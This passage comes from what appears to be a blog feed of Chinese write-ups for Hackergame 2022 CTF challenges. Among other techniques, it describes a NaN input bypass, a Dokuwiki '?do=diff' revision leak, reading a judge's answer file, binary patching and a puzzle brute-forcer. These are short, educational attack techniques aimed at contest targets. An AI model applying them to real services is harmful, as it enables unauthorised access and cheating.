卡第一个扇区的末尾。你能找到它吗？</p><p><strong>操作系统</strong></p><p>室友的“操作系统”会输出一些调试信息和第二个 flag。从室友前些日子社交网络发布的终端截图看，这个“操作系统”每次“启动”都会首先输出：</p><blockquote><p>LED: ON<br>Memory: OK</p></blockquote><p>或许你可以根据这一部分固定的输出和引导扇区的代码，先搞清楚那“串口”和“SD 卡驱动”到底是怎么工作的，之后再仔细研究 flag 到底是什么，就像当年的 Enigma 一样。</p></blockquote><p>第一部分直接使用 PulseView 软件读取 binary 文件，得到信号，然后添加 SD card（SPI mode）解码器，将几个信号接上，就可以在 MOSI data 中看到 flag</p><p><img src="/p/169d9f3d/sd.png"></p><p>dump 出来然后转换即可得到 flag：<strong>flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}</strong></p><p>第二部分试图逆向后面的 RISCV 指令，但完全看不出什么有意义的东西，怀疑是数据搞错了，懒得修，罢了。</p><hr><h2 id="企鹅拼盘"><a href="#企鹅拼盘" class="headerlink" title="企鹅拼盘"></a>企鹅拼盘</h2><blockquote><p>这是一个可爱的企鹅滑块拼盘。（觉得不可爱的同学可以换可爱的题做）</p><p>和市面上只能打乱之后拼回的普通滑块拼盘不同，这个拼盘是自动打乱拼回的。一次游戏可以帮助您体验到 16/256/4096 次普通拼盘的乐趣。</p><p>每一步的打乱的方式有两种，选择哪一种则由您的输入（长度为 4/16/64 的 0/1 序列）的某一位决定。如果您在最后能成功打乱这个拼盘，您就可以获取到 flag 啦，快来试试吧wwwwww</p></blockquote><p>第一部分输入只有四个 bit，直接手动试就能试出来答案是 1000，flag：<strong>flag{it_works_like_magic_……}</strong></p><p>第二部分输入有 16 个 bit，可以用代码爆破一下，将题给代码中的主逻辑复制出来，枚举输入跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Board</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.b = [[i*<span class="number">4</span>+j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_blkpos</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> self.b[i][j] == <span class="number">15</span>:</span><br><span class="line">                    <span class="keyword">return</span> (i, j)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                self.b[i][j] = i*<span class="number">4</span> + j</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self, moves</span>):</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> moves:</span><br><span class="line">            i, j = self._blkpos()</span><br><span class="line">            <span class="keyword">if</span> m == <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                self.b[i][j] = self.b[i][j-<span class="number">1</span>]</span><br><span class="line">                self.b[i][j-<span class="number">1</span>] = <span class="number">15</span></span><br><span class="line">            <span class="keyword">elif</span> m == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                self.b[i][j] = self.b[i][j+<span class="number">1</span>]</span><br><span class="line">                self.b[i][j+<span class="number">1</span>] = <span class="number">15</span></span><br><span class="line">            <span class="keyword">elif</span> m == <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">                self.b[i][j] = self.b[i-<span class="number">1</span>][j]</span><br><span class="line">                self.b[i-<span class="number">1</span>][j] = <span class="number">15</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.b[i][j] = self.b[i+<span class="number">1</span>][j]</span><br><span class="line">                self.b[i+<span class="number">1</span>][j] = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__bool__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> self.b[i][j] != i*<span class="number">4</span> + j:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;chals/b16_obf.json&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    branches = json.load(f)</span><br><span class="line"></span><br><span class="line">b = Board()</span><br><span class="line">start = ...</span><br><span class="line">end = ...</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(start, end)):</span><br><span class="line">    b.reset()</span><br><span class="line">    bits = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> branch <span class="keyword">in</span> branches:</span><br><span class="line">        b.move(branch[<span class="number">1</span>] <span class="keyword">if</span> bits[branch[<span class="number">0</span>]] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> branch[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">if</span> b:</span><br><span class="line">        <span class="built_in">print</span>(bits)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆破出结果为 0010111110000110，flag：<strong>flag{Branching_Programs_are_NC1_……}</strong></p><p>第三部分太复杂了，应该爆破不出来，毕竟这是一道 math 题，开摆。</p><hr><h2 id="火眼金睛的小-E"><a href="#火眼金睛的小-E" class="headerlink" title="火眼金睛的小 E"></a>火眼金睛的小 E</h2><blockquote><p>小 E 有很多的 ELF 文件，它们里面的函数有点像，能把它们匹配起来吗？</p><p>小 A：这不是用 BinDiff 就可以了吗，很简单吧？</p></blockquote><p>只做了右手就行的第一部分，也就是两次达到 100% 正确。拖进 IDA 中硬看，找 CFG 图以及汇编代码比较类似的函数即可，时限也很长，不用着急，很容易就能找到相似的函数。提交拿到 flag：<strong>flag{easy_to_use_bindiff_……}</strong> （笑死，根本没用 bindiff）</p><p>第二部分要求一个小时内完成 100 题中的 40 题，第三部分要求三小时内完成 200 题中的 60 题，不想做，开摆。</p><hr><p>剩下的一些题，general 差一个 OJ 第二问不知道咋做，区块链也不知道咋做，感觉很神奇。web 差一道题，可能是 SQL 注入？反正我本来也不会，就不做了。其它的就是 binary/math 了，等着赛后看 writeup 学习学习。</p><div style="display: flex; justify-content: space-between;"><p><a href="/p/4fd94ed.html">&lt; #2</a></p><p><a href="/p/a86683c.html">#4 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/4fd94ed.html&quot;&gt;&amp;lt; #2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/a86683c.html&quot;&gt;#4 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;这篇 Writeup 写一下 Hackergame 2022 里刚囤 flag 时做的剩下一部分题：&lt;br&gt;微积分计算小练习、蒙特卡罗轮盘赌、二次元神经网络、光与影、片上系统、企鹅拼盘、火眼金睛的小 E&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2022」#2 Writup 囤囤囤 0</title>
    <link href="https://blog.tonycrane.cc/p/4fd94ed.html"/>
    <id>https://blog.tonycrane.cc/p/4fd94ed.html</id>
    <published>2022-10-26T21:18:13.000Z</published>
    <updated>2022-10-27T12:59:03.799Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/c8afb596.html">&lt; #1</a></p><p><a href="/p/169d9f3d.html">#3 &gt;</a></p></div><p>这篇 Writeup 写一下 Hackergame 2022 里刚囤 flag 时做的一部分题：<br>旅行照片 2.0、猜数字、Flag 的痕迹、安全的在线测评、线路板、Flag 自动机、杯窗鹅影</p><span id="more"></span><hr><h2 id="旅行照片-2-0"><a href="#旅行照片-2-0" class="headerlink" title="旅行照片 2.0"></a>旅行照片 2.0</h2><blockquote><p>你的学长决定来一场蓄谋已久的旅行。通过他发给你的照片来看，酒店应该是又被他住下了。</p><p><img src="/p/4fd94ed/travel-photo-2.jpeg"></p></blockquote><h3 id="照片分析"><a href="#照片分析" class="headerlink" title="照片分析"></a>照片分析</h3><style>.content blockquote ol {    margin-top: 0;}</style><p>第一部分是五个关于图片 exif 信息的问题，直接使用 exiftool 读取即可：</p><blockquote><ol><li>图片所包含的 EXIF 信息版本是多少？（如 2.1）。</li></ol></blockquote><p>exiftool 显示是 0231，但实际上是 <strong>2.31</strong>。</p><blockquote><ol start="2"><li>拍照使用手机的品牌是什么？</li></ol></blockquote><p>exiftool 可以看到 <code>Make: Xiaomi</code>，所以答案是 <strong>小米/红米</strong>。</p><blockquote><ol start="3"><li>该图片被拍摄时相机的感光度（ISO）是多少？（整数数字，如 3200）</li></ol></blockquote><p><code>ISO: 84</code>，所以答案为 <strong>84</strong>。</p><blockquote><ol start="4"><li>照片拍摄日期是哪一天？（格式为年/月/日，如 2022/10/01。按拍摄地点当地日期计算。）</li></ol></blockquote><p><code>Create Date: 2022:05:14 18:23:35.220027+09:00</code>，所以答案为 <strong>2022/05/14</strong>。</p><blockquote><ol start="5"><li>照片拍摄时是否使用了闪光灯？</li></ol></blockquote><p><code>Flash: Off, Did not fire</code>（或者看反光也能看出来）所以答案为 <strong>否</strong>。</p><p>flag：<strong>flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}</strong></p><h3 id="社工实践"><a href="#社工实践" class="headerlink" title="社工实践"></a>社工实践</h3><p>接下来第二部分是五个关于图片社工分析的问题。</p><blockquote><ol><li>请写出拍照人所在地点的邮政编码，格式为 3 至 10 位数字，不含空格或下划线等特殊符号（如 230026、94720）。</li></ol></blockquote><p>通过放大图片可以看到楼下的体育馆外面写的有 “ZOZO” 样式，搜索可以找到这里是日本千叶海洋球场。通过 Google 地图找到拍照人所在地点：APA HOTEL&amp; RESORT TOKYO BAY MAKUHARI 〒261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3，所以邮编为 <strong>2610021</strong>。（这里有个坑，日本邮编划分很细，球场和酒店的邮编不一样，所以要注意）</p><blockquote><ol start="2"><li>照片窗户上反射出了拍照人的手机。那么这部手机的屏幕分辨率是多少呢？（格式为长 + 字母 x + 宽，如 1920x1080）</li></ol></blockquote><p>通过京东搜索小米手机，以及玻璃反光中的后置摄像头样式可以知道这部手机是红米 Note 9，屏幕分辨率为 <strong>2340x1080</strong>。</p><blockquote><ol start="3"><li>仔细观察，可以发现照片空中（白色云上方中间位置）有一架飞机。你能调查出这架飞机的信息吗？，包括 起飞机场（IATA 机场编号，如 PEK）、降落机场（IATA 机场编号，如 HFE）、航班号（两个大写字母和若干个数字，如 CA1813）</li></ol></blockquote><p>做这道题的时候时间正好是下午五点二十多，对应日本时间下午六点二十多，也就是类似拍照的时间，在实时飞机航线地图中正好看见有一架飞机在该处上空，起飞机场是 HND。通过飞机方向可以确定起飞机场就是 <strong>HND</strong>。然后找到每天大概这个时间从 HND 出发向北的飞机，通过尝试得到降落机场为 <strong>HIJ</strong>，航班号为 <strong>NH683</strong>。（也可以爆破，这道题的验题逻辑是将表单结果进行 base64，然后 GET 结果.txt，正确则 200 且里面是 flag，错误则 404）</p><p>flag：<strong>flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}</strong></p><hr><h2 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h2><blockquote><p>这个小游戏需要做的事情非常简单：在 0 和 1 之间猜一个数字（精确到小数点后 6 位），并通过反馈的「大」还是「小」修正猜测，直至完全猜中。一次性命中的概率显然也是一百万分之一（和五边形的「嫩牛七方」达成了某种意义上的同构）——但从学霸室友手中借来的概率论与统计学笔记上万千公式的模样在思绪中一瞬而过，于是你默默祈祷着大数定理，虔诚地按下了提交的按钮。</p></blockquote><p>题目给出了网页服务的 Java 源码。本来想着是爆破伪随机数，不过源码里用的是 SecureRandom，不能爆破。然后仔细看源码。发现了一些比较可疑的东西，明明比较的都是六位小数，是可以乘 1000000 然后判断整数相等的，但它偏要比较输入和两个小数的大小（是否不大于且不小于）。而如果输入是 NaN，则任何比较都是 False，也就让程序认为输入和预期相等了。</p><p>不过因为规定了小数，所以 NaN 在前端不能直接写入，需要手动 POST 到 <code>/state</code>，用一个任意数字试一下，可以在 DevTool 里捕获到 POST 数据格式。然后手动 POST 一个 &lt;state&gt;&lt;guess&gt;NaN&lt;/guess&gt;&lt;/state&gt; 再 GET 一下就能在返回数据中看到 flag：<strong>flag{gu3ss-n0t-a-numb3r-1nst3ad-……}</strong></p><hr><h2 id="Flag-的痕迹"><a href="#Flag-的痕迹" class="headerlink" title="Flag 的痕迹"></a>Flag 的痕迹</h2><blockquote><p>小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。</p><p>「这样就应该就不会泄漏 flag 了吧」，小 Z 如是安慰自己。</p><p>然而事实真的如此吗？</p><blockquote><p>（题目 Dokuwiki 版本基于 2022-07-31a “Igor”）</p></blockquote></blockquote><p>一个 Dokuwiki 框架搭的网站，目标是找到首页的修改。版本是最新的，搜不到啥漏洞。自己部署了一下玩玩，看起来 revisions 等功能关掉之后确实没法看修改记录了。而且题目是 external edit，也就是直接修改了文件，而没有通过网页编辑。</p><p>然后就读了读源码，搜了下 issue 看到了一个 revision 相关的 <a href="https://github.com/splitbrain/dokuwiki/issues/3576%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%8F%90%E5%88%B0%E4%BA%86">https://github.com/splitbrain/dokuwiki/issues/3576，里面提到了</a> <code>?do=diff</code>，尝试访问 <code>/doku.php?id=start&amp;do=diff</code>，确实能看到修改记录，其中 flag：<strong>flag{d1gandFInD_d0kuw1k1_unexpectEd_API}</strong></p><hr><h2 id="安全的在线测评"><a href="#安全的在线测评" class="headerlink" title="安全的在线测评"></a>安全的在线测评</h2><blockquote><p>传说科大新的在线测评系统（Online Judge）正在锐意开发中。然而，新 OJ 迟迟不见踪影，旧的 OJ 和更旧的 OJ 却都已经停止了维护。某 2022 级计算机系的新生小 L 等得不耐烦了，当即表示不就是 OJ 吗，他 10 分钟就能写出来一个。</p><p><strong>无法 AC 的题目</strong></p><p>为了验证他写的新 OJ 的安全性，他决定在 OJ 上出一道不可能完成的题目——大整数分解，并且放出豪言：只要有人能 AC 这道题，就能得到传说中的 flag。当然，因为目前 OJ 只能运行 C 语言代码，即使请来一位少年班学院的天才恐怕也无济于事。</p><p><strong>动态数据</strong></p><p>为了防止数据意外泄露，小 L 还给 OJ 加入了动态数据生成功能，每次测评会随机生成一部分测试数据。这样，即使 OJ 测试数据泄露，攻击者也没办法通过所有测试样例了吧！（也许吧？）</p></blockquote><p>第一题就是使用 ./data/static.in 和 ./data/static.out 作为输入输出。而且也没有设置权限，所以直接读取 ./data/static.out 内容并输出即可。flag：<strong>flag{the_compiler_is_my_eyes_b18ad6f041}</strong></p><p>第二题动态生成数据，而且设置了权限，用户不能读取，不知道该怎么做。</p><hr><h2 id="线路板"><a href="#线路板" class="headerlink" title="线路板"></a>线路板</h2><blockquote><p>中午起床，看到室友的桌子上又多了一个正方形的盒子。快递标签上一如既往的写着：线路板。和往常一样，你“帮”室友拆开快递并抢先把板子把玩一番。可是突然，你注意到板子表面似乎写着些东西……看起来像是……flag？</p><p>可是只有开头的几个字母可以看清楚。你一时间不知所措。</p><p>幸运的是，你通过盒子上的联系方式找到了制作厂家，通过板子丝印上的序列号查出了室友的底细，并以放弃每月两次免费 PCB 打样包邮的机会为代价要来了这批带有 flag 的板子的生产文件。那这些文件里会不会包含着更多有关 flag 的信息呢？</p></blockquote><p>给了一些 gbr 文件，搜了一下用 Gerbv 打开。发现 flag 相关内容在 F_Cu 这部分上，有一些圆环遮挡了，点击去掉就可以看见 flag：<strong>flag{8_1ayER_rogeRS_81ind_V1a}</strong></p><p><img src="/p/4fd94ed/gerbv.png"></p><hr><h2 id="Flag-自动机"><a href="#Flag-自动机" class="headerlink" title="Flag 自动机"></a>Flag 自动机</h2><blockquote><p>Hackergame 2022 组委会为大家搬来了一台能够自动获取 flag 的机器。然而，想要提取出其中的 flag 似乎没那么简单……</p></blockquote><p>一个使用 Win32 API 的窗口程序的逆向。夺取 flag 的按钮点不上。逆向一下，在 WinMain 函数里看到注册了一个事件处理函数在 0x401510 处。枚举了 msg 的值，也就是事件：</p><ul><li>1：即创建窗口，创建了三个按钮，一个是 “狠心夺取”，对应的 hMENU 为 3，一个 “放手离开”，hMENU 为 2，一个没有显示不管</li><li>0x111：即点击，此时的参数 wParam（即 a3）为点击的按钮的 hMENU，当 a3 为 2 时退出，a3 为 3 时检查 lParam 是否为 114514，如果是则输出 flag 到文件中</li></ul><p>因此可以直接在汇编里 patch 一下程序，将判断 a3 为 2 或 3 调换一下，然后再将判断 lParam 的 jz 变成 jnz。之后 Apply、运行点击放手离开即可输出 flag：<strong>flag{Y0u_rea1ly_kn0w_Win32API_……}</strong></p><hr><h2 id="杯窗鹅影"><a href="#杯窗鹅影" class="headerlink" title="杯窗鹅影"></a>杯窗鹅影</h2><blockquote><p>说到上回，小 K 在获得了实验室高性能服务器的访问权限之后就迁移了数据（他直到现在都还不知道自己的家目录备份被 Eve 下载了）。之后，为了跑一些别人写的在 Windows 下的计算程序，他安装了 wine 来运行它们。</p><p>「你用 wine 跑 Windows 程序，要是中毒了咋办？」</p><p>「没关系，大不了把 wineprefix 删了就行。我设置过了磁盘映射，Windows 程序是读不到我的文件的！」</p><p>但果真如此吗？</p><p>为了验证这一点，你需要点击「打开/下载题目」按钮，上传你的程序实现以下的目的：</p><ol><li>/flag1 放置了第一个 flag。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来读取到第一个 flag 吗？</li><li>/flag2 放置了第二个 flag，但是需要使用 /readflag 程序才能看到 /flag2 的内容。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 /readflag 程序来读取到第二个 flag 吗？</li></ol></blockquote><p>第一个 flag 也很简单，直接读取 /flag1 输出就可以了。</p><p>第二个 flag 搞的时候试过 system、execl 啥的，一些命令都没办法执行，不知道该怎么办，不想研究了，开摆</p><hr><p>剩下的写在下一篇里</p><div style="display: flex; justify-content: space-between;"><p><a href="/p/c8afb596.html">&lt; #1</a></p><p><a href="/p/169d9f3d.html">#3 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/c8afb596.html&quot;&gt;&amp;lt; #1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/169d9f3d.html&quot;&gt;#3 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;这篇 Writeup 写一下 Hackergame 2022 里刚囤 flag 时做的一部分题：&lt;br&gt;旅行照片 2.0、猜数字、Flag 的痕迹、安全的在线测评、线路板、Flag 自动机、杯窗鹅影&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2022」#1 Writup 开局杀题</title>
    <link href="https://blog.tonycrane.cc/p/c8afb596.html"/>
    <id>https://blog.tonycrane.cc/p/c8afb596.html</id>
    <published>2022-10-26T21:13:38.000Z</published>
    <updated>2022-10-29T04:27:33.496Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/630bfdd5.html">&lt; #0</a></p><p><a href="/p/4fd94ed.html">#2 &gt;</a></p></div><p>这篇 Writeup 写一下 Hackergame 2022 里刚开局时做的一些简单题：<br>签到、猫咪问答喵、家目录里的秘密、HeiLang、Xcaptcha、LaTeX 机器人、链上记忆大师</p><span id="more"></span><hr><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>众所周知，签到题是一道手速题。</p><p>为了充分发挥出诸位因为各种原因而手速优异于常人的选手们的特长，我们精心设计了今年的签到题。进一步地，为了更细致地区分不同手速的选手，我们还通过详尽的调研及统计分析，将签下字符的时间限制分为了多个等级。只有最顶尖的手速选手，才能在 CPU 来得及反应之前顺利签下 2022，从而得到光荣的 flag！</p></blockquote><p>一个网站，手写数字成功识别为 2022 就可以完成签到。不过限制了每个数字的时间，依次为 2s、1s、0.1s、0s。</p><p>我还天真地试着签了好几次（其实是没注意到那个 0），<del>痛失一血</del>。</p><p>做法其实是在源码里发现识别都在前端进行，最终提交的时候是跳转到 <code>/?result=....</code> 页面（或者交一次试一下也能看出来）。所以直接访问 <code>/?result=2022</code> 即可拿到 flag：<strong>flag{HappyHacking2022-……}</strong></p><hr><h2 id="猫咪问答喵"><a href="#猫咪问答喵" class="headerlink" title="猫咪问答喵"></a>猫咪问答喵</h2><blockquote><p>参加猫咪问答喵，参加喵咪问答谢谢喵。</p></blockquote><p>经典题目，搜索大杂烩。除了第五题以外还是很容易找到的。（这次竟然分了两个 flag 出来 2333）</p><style>.content blockquote ol {    margin-top: 0;}</style><blockquote><ol><li>中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？</li></ol></blockquote><p>直接搜索了一下 “中国科技大学 NEBULA 战队”，找到了一篇新闻：<a href="http://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm">中国科学技术大学星云（Nebula）战队在第六届强网杯再创佳绩</a>，其中文末有简单介绍 “中国科学技术大学星云战队（Nebula）成立于 <em>2017 年 3 月</em>……”</p><p>所以答案就是 <strong>2017-03</strong>。</p><blockquote><ol start="2"><li>2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @ USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland 后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？</li></ol></blockquote><p>在 LUG @ USTC 的 wiki 就能找到软件自由日活动的页面：<a href="https://lug.ustc.edu.cn/wiki/lug/events/sfd/">Software Freedom Day</a>，其中可以找到所说的那篇 slides：<a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf">《GNOME Wayland 使用体验：一个普通用户的视角》</a>，其中第十五页讲了所谓的 KDE 程序在 Wayland 下的显示问题。但截图里并没有软件名，把下面一行工具栏的文本全怼到必应里，搜到了 Kdenlive 的官方文档。</p><p>所以答案是 <strong>Kdenlive</strong>。</p><blockquote><ol start="3"><li>22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？</li></ol></blockquote><p>搜索 “Firefox Windows 2000” 可以看到 Firefox 13 不再支持 Windows 2000 的很多新闻。</p><p>所以答案是 <strong>12</strong>。</p><blockquote><ol start="4"><li>你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux 内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master 分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！</li></ol></blockquote><p>在 Linux 内核 GitHub dev 页面全局搜索了一下 argc == 0，发现了一些检查。找到个比较像的进到页面里 blame，找到了 commit：<a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">exec: Force single empty string when argv is empty</a>（其实 commit message 里就写了 CVE-2021-4034）。</p><p>所以答案是 <strong>dcd46d897adb70d63e025f175a00a89797d31a43</strong>。</p><blockquote><ol start="5"><li>通过监视猫咪在键盘上看似乱踩的故意行为，不出所料发现其秘密连上了一个 ssh 服务器，终端显示 <code>ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.</code>，你知道猫咪在连接什么域名吗？</li></ol></blockquote><p>比较难搞的一道题，想了很长时间，甚至以为是一些 crypto 题。不过毕竟是一道搜索题，于是直接把 md5 fingerprint 怼到谷歌里，搜到了一个文档其中有这个（可能是做个例子）：<a href="https://docs.zeek.org/en/master/logs/ssh.html#outbound-movement">Zeek Logs &gt; ssh.log</a>。看到里面对应的 ip：205.166.94.16，访问进去看到了 sdf.org 域名。</p><p>所以答案是 <strong>sdf.org</strong>。（其实是囤 flag 阶段才做出来的）</p><blockquote><ol start="6"><li>中国科学技术大学可以出校访问国内国际网络从而允许云撸猫的“网络通”定价为 20 元一个月是从哪一天正式实行的？</li></ol></blockquote><p>搜了一下，发现了一篇通知：<a href="https://www.ustc.edu.cn/info/1057/4931.htm">关于实行新的网络费用分担办法的通知</a>，是 2011 年 1 月 1 日施行的，但是这篇通知里国际网络通费用并没有改变，还是 20 元。看来是比较久远的事情了。搜索同名通知，可以发现<a href="http://ustcnet.ustc.edu.cn/2003/0301/c11109a210890/pagem.htm">另一篇</a>。里面写了国际网络通定价 20 元，2003 年 3 月 1 日实行。</p><p>所以答案是 <strong>2003-03-01</strong>。</p><p>交上去得到两个 flag（一个是对三道题的，一个是对六道题的）：<br><strong>flag{meowexammeow_……}</strong><br><strong>flag{meowexamfullymeowed!_……}</strong></p><hr><h2 id="家目录里的秘密"><a href="#家目录里的秘密" class="headerlink" title="家目录里的秘密"></a>家目录里的秘密</h2><blockquote><p>实验室给小 K 分配了一个高性能服务器的账户，为了不用重新配置 VSCode, Rclone 等小 K 常用的生产力工具，最简单的方法当然是把自己的家目录打包拷贝过去。</p><p>但是很不巧，对存放于小 K 电脑里的 Hackergame 2022 的 flag 觊觎已久的 Eve 同学恰好最近拿到了这个服务器的管理员权限（通过觊觎另一位同学的敏感信息），于是也拿到了小 K 同学家目录的压缩包。</p><p>然而更不巧的是，由于 Hackergame 部署了基于魔法的作弊行为预知系统，Eve 同学还未来得及解压压缩包就被 Z 同学提前抓获。</p><p>为了证明 Eve 同学不良企图的危害性，你能在这个压缩包里找到重要的 flag 信息吗？</p></blockquote><p>给了一个用户家目录的压缩包，进去全局搜索一下 flag 可以发现 VSCode 的历史文件里有一个 DUGV.c 里有一个注释掉的 flag：**flag{finding_everything_through_vscode_config_file_……}**（抢了个一血 2333）</p><p>第二部分还是有些复杂的。搜 flag 的时候还可以发现 .config/rclone/rclone.conf 里有一个名为 flag2 的配置项：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[flag2]</span></span><br><span class="line"><span class="attr">type</span> = ftp</span><br><span class="line"><span class="attr">host</span> 